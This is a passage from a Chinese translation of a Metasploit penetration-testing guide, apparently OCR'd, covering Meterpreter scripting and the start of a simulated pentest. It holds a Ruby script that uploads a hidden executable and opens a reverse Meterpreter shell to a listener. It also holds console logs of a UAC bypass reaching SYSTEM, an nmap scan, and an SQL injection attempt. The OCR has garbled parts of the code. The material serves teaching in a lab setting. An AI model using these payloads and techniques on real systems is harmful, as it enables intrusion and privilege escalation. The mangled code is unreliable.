"-h" => [ false,
"This help menu. Spawn a meterpreter shell by uploading and
executing."],
"-r"
"The IP of a remote Metasploit listening for the connect back"],
"-p"
=>
true,
"The port on the remote host where Metasploit is listening
(default:4444)"]
）
#
#Default parameters
#
filename =Rex::Text.rand_text_alpha((rand(8)+6))+".exe"
rhost
=Rex::Socket.source_address("1.2.3.4")
rport
= 4444
lhost
=
"127.0.0.1"
pay
= nil
#
#Option parsing
#
opts.parse(args) do lopt,idx, vall
case opt
when "-h"
print_line(info)
print_line(opts.usage)
raise Rex::Script::Completed
when "-r"
rhost=val
when "-p"
rport = val.to_i
end
end
payload ="windows/meterpreter/reverse_tcp"
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST']=rhost
pay.datastore['LPORT'] = rport
mul =client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['woRKSPACE']=client.workspace
mul.datastore['PAYLOAD']= payload
mul.datastore['EXITFUNC']='process'
mul.datastore['ExitonSession']=true
print_status("Running payload handler")
mul.exploit_simple(
.peotred.
'RunAsJob' => true
247
---
## Page 275
Metasploit渗透测试指南
if client.platform=~/win32|win64/
tempdir =client.fs.file.expand_path("%TEMP%")
print_status("Uploading meterpreter to temp directory")
raw= pay-generate
exe=::Msf::Util::EXE.to_win32pe(client.framework,raw)
tempexe = tempdir + "\\" + filename
tempexe.gsub!("\1\\"，"\\")
fd = client.fs.file.new(tempexe, "wb")
fd.write(exe)
fd.close
print_status("Executing the payload on the system")
pid = session.sys.process.execute(execute_payload,nil,{'Hidden′=> true})
end
现在，我们有了新创建的Meterpreter脚本文件，让我们开启Metasploit，进入到Meterpreter
中，并运行该脚本：
meterpreter >run execute_upload -r 172.16.32.129-p 443
[*]  Running payload handler
[*] Uploading meterpreter to temp directory
[*]Executing the payload on the system
[*]Sending stage (749056 bytes) to 172.16.32.170
[*]Meterpreter Session 2 opened (172.16.32.129:443 -> 172.16.32.170:1140)at
TueNov 3023:24:19-05002010
meterpreter>
成功！我们已经创建了一个Meterpreter脚本，成功执行了它并产生了一个新的Meterpreter
shell。这个简单的例子显示了Meterpreter脚本和Ruby语言强大的能力。
我们之前简要讨论了一个重要的变化趋势就是将Meterpreter脚本转化为Metasploit模块类
似格式（译者注：即最新推出的Metasploitv4.0中正式引入的后渗透攻击模块），我们将演示一
个可以绕过Windows7UAC机制的此类模块。WindowsVista以及之后的版本引I入了类似UNIX
和Linux中的sudo命令，有了这个特性后，一个普通用户权限账户需要执行某些任务时，需要
得到管理员权限账户的授权许可。这时候会弹出一个窗口，显示用户需要系统管理员的允许才
能进行此操作。UAC的最终目标是保护系统避免被攻陷或被病毒感染，并只将危害后果限制在
一个用户账户权限下。
在2010年12月，DaveKennedy和KevinMitnick发布了一个用来绕过Windows用户账户
控制（UAC）的Meterpreter模块，该模块将攻击载荷注入到拥有可信发布者证书并被认为是
被装载，并在UAC安全的进程空间中运行，这个DLL就可以绕过UAC来运行命令。
248
---
## Page 276
第16章Meterpreter脚本编程
在这个案例中，我们将演示如何使用这个可以绕过用户账户控制（UAC）的后渗透攻击模
块。首先使用-j标识符来启动一个多句柄监听器（multi/handler）模块，这样允许我们接受多个
Meterpretershell。请注意在本例中，当我们运行getsystem命令的时候失败了，这是因为Windows
用户账户控制（UAC）机制阻止我们使用该命令。
resource(src/program_junk/meta_config)>exploit-j
[*]Exploit running asbackground job.
msf exploit(handler)>
[*]Startedreversehandleron0.0.0.0:443
[*] Starting the payload handler...
[*] Sending stage (749056 bytes） to 172.16.32.130
[*]Meterpreter session 1opened (172.16.32.128:443 ->172.16.32.130:2310) at
Thu June0908:02:45-05002011
msf exploit(handler)> sessions -i 1
[*]Starting interaction with 1...
meterpreter>getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter > sysinfo
Computer:DAVE-DEV-PC
OS
:Windows 7 (Build 7600).
Arch:x64 (Current Process is wow64)
Language:en_US
meterpreter>
注意：我们无法获得一个系统权限的账户，因为用户账户控制（UAC）阻拦了我们的入侵。
我们需要绕开用户账户控制，从而获得系统权限账户，这样才能作为系统管理员进一步入侵主
机。我们输入CTRL-Z跳出并保持该会话依然存在。之后，我们使用新的格式来运行后渗透攻
击模块，从而绕过Windows用户账户控制（UAC）防护功能。
msf exploit(handler)>use post/windows/escalate/bypassuac
msf post(bypassuac)>show options
Moduleoptions(post/windows/escalate/bypassuac):
Name
Current Setting Required Description
LHOST
no
Listener IP address for the new session
LPORT
4444
no
Listener port for the new session
SESSION
yes
The session to run this module on.
msf post(bypassuac) > set LHOST 172.16.32.128
LHOST => 172.16.32.128
msf post(bypassuac)> set SESSIoN 1
SESSION =>1
msf post(bypassuac) > exploit
[*]Started reverse handler on 172.16.32.128:4444
[*] Starting the payload handler...
[*]UploadingthebypassUACexecutabletothefilesystem...
249
---
## Page 277
Metasploit渗透测试指南
[*]Meterpreter stager executable 738o2 bytes long being uploaded..
[*] Uploaded the agent to the filesystem....
[*]Post moduleexecution completed
msfpost(bypassuac)>
[*]Sending stage(749056 bytes) to 172.16.32.130
[*] Meterpreter session 2 opened (172.16.32.128:4444 -> 172.16.32.130:1106) at Thu June 09
19:50:54 -0500 2011
[*] Session ID 2(172.16.32.128:4444 -> 172.16.32.130:1106） processing InitialAutoRunScript
'migrate-f'
[*] Current server process: tYNpQMP.exe (3716)
[*] Spawning a notepad.exe host process...
[*]Migrating into process ID 3812
[*]New server process:notepad.exe(3812)
msf post(bypassuac)> sessions -i 2
[*]Starting interaction with 2...
meterpreter>getsystem
...got system (via technique 1).
meterpreter>
我们也可以在Meterpreter控制台中使用run来替换use，这样可以启动默认选项执行攻击，
而不需要我们自己来配置这些选项。
注意到我们在上述例子中已经成功获得了目标主机（打开了UAC保护）的系统级权限，
这个小例子很好地说明了后渗透攻击模块是如何配置并最终执行的。这段代码的功能很简单，
就是把先前编译好的可执行文件上传至目标主机，然后将它运行起来。仔细查看后渗透攻击模
块的源码，你会更好地理解幕后的技术细节。
root@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb
16.5小结
我们不可能将后渗透攻击模块的每个细节都覆盖到，因为这将与13章介绍的内容会有所重
复。仔细的查看本章的每一行，之后试着去创建你自已的模块。
通过阅读每个已经存在的Meterpreter脚本，查看每一个可以被用来创建脚本的命令、调用
以及函数。如果你有一个新的想法并编写成了脚本，请提交到Metasploit 开发团队，说不定你
的脚本也可能被其他人所使用！
250
---
## Page 278
第
章
一次模拟的渗透测试过程
将在一个模拟的渗透测试过程把你在之前章节中所学到的技术都贯穿在一起，你将从本书中
使用所学的知识和技能来模拟完成一次渗透测试过程，而你应该对这章中的大多数过程都比
较熟悉了。
在开始本次渗透测试之旅前，请先下载和安装一个名为Metasploitable的Linux靶机虚拟机
镜像。（你可以在http://www.thepiratebay.org/torrent/5573179/Metasploitable/找到这个镜像的下
载）Metasploitable创建的目的就是为学习和使用Metasploit的爱好者提供一个可以进行成功渗
透测试实验的环境。请参考网站上的指南来安装Metasploitable，然后启动它。你可以将
Metasploitable虚拟机和通过附录A演示步骤建立的WindowXP靶机放在一块来模拟一个很小
的网络环境，让WindowsXP靶机作为一个互联网可直接访问的系统，而Metasploitable靶机则
---
## Page 279
Metasploit渗透测试指南
作为一一个内网主机节点。
提示：本章模拟的渗透测试过程是一个小型的测试。当在面对一个大型企业网络的时候，
往往需要做更多更加深入的渗透，我们这里尽量对场景进行简化，使你可以更容易地来演练
整个过程。
17.1前期交互
规划是前期交互阶段的第一个步骤。在一次真正的规划过程中，需要利用像社会工程学、
无线网络、互联网查询或内部的攻击渠道，来规划出攻击的潜在目标对象和主要采用的攻击方
法。与一次实际的渗透测试不同的是，我们这里并不是针对一个特定的组织或一组系统，只是
对我们已知的虚拟机靶机来进行一次模拟的渗透测试。
在这次模拟渗透测试中，我们的目标对手在防护部署在172.16.32.162上的Metasploitable
虚拟机（使用用户名和口令均是msfadmin可登录Metasploitable，并对其IP进行配置）。
Metasploitable是一台只连接了内网，并在防火墙保护之后，没有直接连入互联网的主机。而我
们的WindowsXP靶机配置在172.16.32.131IP地址上直接连接互联网，也是在防火墙保护后（开
启了WindowsFirewall)，只开放了80端口。
17.2情报搜集
下一个步骤情报搜集是在渗透测试过程中最重要的环节之一，因为如果你在这里忽略了某
些信息，你可能会失去整个攻击成功的可能性。我们在这个环节中的目标是了解将要攻击的目
标系统，并确定如何才能够取得对系统的访问权。
开放的。在这里使用了nmap的隐蔽TCP扫描，这种扫描技术通常能够在不会触发报警的前提
下扫描出开放的端口。大多数入侵检测系统与入侵防御系统都可以检测端口扫描，但由子端口
扫描在互联网上是如此普遍，所以它们往往会将其作为常规的互联网流量噪音而忽略，除非你
的扫描非常野蛮。
root@bt:/# nmap -sT -P0 172.16.32.131
Nmap scanreportfor172.16.32.131
Host is up (0.00071s latency).
252
---
## Page 280
第17章一次模拟的渗透测试过程
Not shown:999 filtered ports
PORTSTATESERVICE
80/tcp openhttp
Nmapdone:1IPaddress(1hostup）scannedin17.46seconds
我们发现这台目标主机看起来是一台Web服务器，这在攻击互联网上可直接访问的系统时
例中，我们找到了标准的HTTP端口80是开放监听并可访问的。如果使用浏览器去访问它，可
以看到如图17-1所示的一个网页。
图17-1找出靶机上的一个Web应用程序
17.3威胁建模
识别出80端口是开放之后，我们可以再进行进一步的查点来发现更多可能的情报，但是已
让我们开始做一次威胁建模，来尝试找出进入这台系统最佳的攻击路径。找到的网页给我
们提供了输入用户名和口令的地方。在这时，作为一名有经验的渗透测试者，你应该先跳出具
体场景的细节来思考一下，来确定出一条可以走的最佳路径。当你进行应用层的安全渗透测试
时，应该考虑使用Metasploit之外的-一些渗透工具，比如对Web渗透测试可以考虑BurpSuite
（http://www.portswigger.net/）等等，千万不要把你自己绑死在一个单独的工具上，即使它非常强
大。在这个案例中，我们将尝试一次手工的攻击过程，在用户名输入框中敲入"TEST（请注
意开始的单引号)，并在口令输入框中敲入一个单引号，如图17-2中所示的那样，我们再提
253
---
## Page 281
Metasploit渗透测试指南
交这个表单。
图17-2尝试利用SQL注入
让我们先花一些时间来想想后台服务接收到这样的输入后会发生什么，这里简单地尝
试插入一些特意伪造的数据到后台的SQL语句中，当然现在在野外你可能很难找到很多
Web应用程序可以如此容易攻击了，但这提供了一个很好的例子一在不久之前这种类型
的错误还是在不断地被发现。当我们点击提交按钮，便获得了如图17-3中所示的错误信